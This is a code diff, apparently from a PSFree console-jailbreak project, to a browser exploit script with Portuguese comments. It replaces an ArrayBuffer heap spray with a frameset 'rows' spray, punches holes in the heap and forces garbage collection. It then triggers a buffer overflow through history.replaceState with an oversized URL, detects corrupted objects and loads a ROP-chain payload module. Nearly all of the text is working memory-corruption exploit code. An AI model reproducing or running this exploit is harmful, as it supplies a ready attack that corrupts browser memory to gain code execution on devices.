@@ -1,96 +1,144 @@
-/* PSFree Modular: ArrayBuffer 1MB Strategy */
+/* PSFree Modular: Balanced Flooder
+   Strategy: Fill Heap to ~90% capacity, then poke holes.
+*/
 
 import { log, sleep } from './module/utils.mjs';
 
 const BASE_OFFSET = 709520; 
 const OVERFLOW_AMT = 1024 * 64; 
 
-// Tamanho do ArrayBuffer (1MB)
-const TARGET_SIZE = 1024 * 1024; 
+// Configuração Frameset 1MB
+const TARGET_BYTES = 1024 * 1024;
+const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
+const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);
 
 var victims = [];
+var padding = [];
+var isRunning = false;
 
 async function main() {
-    log("=== PSFree: ArrayBuffer Strategy ===");
-    log("Alvo: Corromper 'byteLength' de um ArrayBuffer de 1MB.");
+    log("=== PSFree: Balanced Flooder ===");
+    log("Meta: Encher o Heap com segurança e disparar.");
 
-    // Tenta offsets próximos, caso o header do ArrayBuffer tenha tamanho diferente
-    for (let shift = 0; shift <= 32; shift += 8) {
-        log(`\n[TESTE] Recuo de Offset: -${shift} bytes`);
-        
-        await prepare_heap();
-        
-        // Tenta disparar com o recuo
-        let success = await trigger_exploit(BASE_OFFSET - shift);
-        
-        if (success) {
-            log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
-            await import('./lapse.mjs');
-            return;
+    // FASE 1: PADDING LEVE (50MB)
+    log("[1] Alocando Padding (50MB)...");
+    try {
+        for(let i=0; i<50; i++) {
+            padding.push(new ArrayBuffer(1024 * 1024)); 
         }
-        
-        victims = [];
-        await forceGC();
+    } catch(e) { log("Padding interrompido (Memória cheia)."); }
+
+    await sleep(100);
+
+    // FASE 2: SPRAY CONTROLADO
+    // Meta: 600. Se der erro antes, paramos e usamos o que temos.
+    const SPRAY_TARGET = 600;
+    victims = [];
+    
+    log(`[2] Iniciando Spray (Meta: ${SPRAY_TARGET})...`);
+    
+    try {
+        for(let i=0; i<SPRAY_TARGET; i++) {
+            try {
+                let fset = document.createElement('frameset');
+                fset.rows = ROWS_STRING;
+                victims.push(fset);
+                
+                if(i % 50 === 0) {
+                    log(`   Alocado: ${i}/${SPRAY_TARGET}`);
+                    await sleep(10); // Respira para não travar UI
+                }
+            } catch(oom) {
+                log(`[!] Limite de Memória atingido em ${i} vítimas.`, 'yellow');
+                log(`    Isso é ÓTIMO. O Heap está 100% cheio.`, 'green');
+                break; // Sai do loop e vai para o ataque
+            }
+        }
+    } catch(e) { log("Erro fatal no spray."); }
+
+    log(`Total alocado: ${victims.length} vítimas.`);
+    await sleep(500);
+
+    // FASE 3: BURACOS (Swiss Cheese)
+    log("[3] Abrindo buracos para o Exploit...");
+    // Apagamos 1 a cada 2
+    for(let i=0; i<victims.length; i+=2) {
+        if(victims[i]) {
+            victims[i].rows = ""; 
+            victims[i] = null;
+        }
     }
     
-    log("Falha.", 'red');
-}
-
-async function prepare_heap() {
-    victims = [];
-    const SPRAY_COUNT = 80;
-
-    // SPRAY ARRAYBUFFER
-    for(let i=0; i<SPRAY_COUNT; i++) {
-        // Cria ArrayBuffer de 1MB
-        let ab = new ArrayBuffer(TARGET_SIZE);
-        // Preenche com padrão reconhecível (opcional, consome CPU)
-        // let view = new Uint8Array(ab); view[0] = 0x41; 
-        victims.push(ab);
-    }
-
-    // BURACOS
-    for(let i=0; i<SPRAY_COUNT; i+=2) {
-        victims[i] = null;
-    }
+    // Força GC para consolidar os buracos
     await forceGC();
-}
 
-async function trigger_exploit(offset) {
-    try {
-        let buffer = "A".repeat(offset);
-        // Overflow direto
-        buffer += "\x01".repeat(OVERFLOW_AMT);
+    // FASE 4: EXPLOIT (LOOP DE PONTE)
+    log("[4] Disparando Exploit...");
+    
+    // Testamos pontes curtas (0, 4, 8, 12, 16)
+    // Pointer Compression = Headers menores
+    for (let bridge = 0; bridge <= 16; bridge += 4) {
+        log(`   > Tentativa: Ponte ${bridge} bytes`);
         
-        history.replaceState({}, "ab_pwn", "/" + buffer);
+        try {
+            let buffer = "A".repeat(BASE_OFFSET);
+            buffer += "\u0000".repeat(bridge); 
+            buffer += "\x01".repeat(OVERFLOW_AMT); 
+            
+            history.replaceState({}, "bal_flood_" + bridge, "/" + buffer);
 
-        return check_victims();
-
-    } catch(e) {
-        return false;
+            if (check_victims()) {
+                return; // Venceu
+            }
+        } catch(e) {
+            log("Erro Trigger: " + e.message);
+        }
+        
+        await sleep(400);
     }
+    
+    log("Ciclo finalizado. Se falhou, tente reiniciar.", 'red');
 }
 
 function check_victims() {
+    // Checa apenas as vítimas vivas (índices ímpares)
     for(let i=1; i<victims.length; i+=2) {
-        let ab = victims[i];
-        if(!ab) continue;
+        let fset = victims[i];
+        if(!fset) continue;
 
-        // SE O TAMANHO MUDOU:
-        if (ab.byteLength !== TARGET_SIZE) {
-            log(`!!! JACKPOT !!! ArrayBuffer ${i} Length: ${ab.byteLength}`, 'green');
+        try {
+            let s = fset.rows;
+            // Se o tamanho mudou
+            if (s.length !== ROWS_STRING.length) {
+                log(`!!! JACKPOT !!! Frameset ${i} Length: ${s.length}`, 'green');
+                
+                // Carrega o Payload
+                start_payload();
+                return true;
+            }
+        } catch(e) {
+            // Se deu erro de leitura (OOM)
+            log(`!!! JACKPOT (OOM) !!! Frameset ${i} corrompido!`, 'green');
+            
+            start_payload();
             return true;
         }
-        
-        // Se conseguirmos criar uma view maior que o tamanho original sem erro,
-        // pode ser um sinal silencioso (embora byteLength deva refletir a mudança).
     }
     return false;
 }
 
+async function start_payload() {
+    log("--- INICIANDO ROP CHAIN ---", 'green');
+    try {
+        await import('./lapse.mjs');
+    } catch(e) {
+        log("Erro ao carregar lapse.mjs: " + e.message);
+    }
+}
+
 async function forceGC() {
     try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-    return new Promise(r => setTimeout(r, 500));
+    return new Promise(r => setTimeout(r, 400));
 }
 
 main();
